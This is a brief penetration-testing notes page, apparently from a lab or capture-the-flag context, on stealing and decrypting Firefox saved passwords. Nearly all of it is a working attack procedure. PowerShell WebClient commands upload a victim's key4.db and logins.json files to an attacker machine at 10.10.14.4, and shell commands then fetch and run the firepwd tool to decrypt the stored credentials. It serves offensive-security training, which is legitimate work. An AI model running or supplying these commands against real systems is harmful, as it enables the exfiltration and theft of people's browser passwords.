# Cracking Firefox Saved Passwords

In Winpeas:

<figure><img src=".gitbook/assets/image (357).png" alt=""><figcaption><p>C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db</p></figcaption></figure>

Upload key4.db and logins.json to attacker's Kali:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://10.10.14.4/', 'C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db')
(New-Object System.Net.WebClient).UploadFile('http://10.10.14.4/', 'C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json')
```

Decrypt firefox saved passwords:

```
wget https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py
wget https://raw.githubusercontent.com/lclevy/firepwd/master/requirements.txt
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 firepwd.py
```

<figure><img src=".gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>
